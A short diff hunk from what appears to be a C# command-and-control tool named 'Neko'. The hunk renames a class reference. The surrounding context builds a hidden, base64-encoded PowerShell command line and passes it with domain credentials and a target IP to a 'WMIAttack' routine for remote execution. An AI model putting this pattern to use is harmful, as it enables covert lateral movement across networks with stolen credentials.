@@ -58,7 +58,7 @@ namespace Neko.Command_and_Control
                 string obfuscatedCommand = Convert.ToBase64String(encoded);
 
                 string commandLine = "cmd.exe /c powershell -windowstyle hidden -noprofile -noninteractive -encodedcommand " + obfuscatedCommand;
-                User_Selections.WMIAttack.Parameters(DomainAuthentication.Username, DomainAuthentication.Password, GetDomainInfo.DomainURL, targetIP, commandLine);
+                UserChoices.WMIAttack.Parameters(DomainAuthentication.Username, DomainAuthentication.Password, GetDomainInfo.DomainURL, targetIP, commandLine);
             }
         }
     }
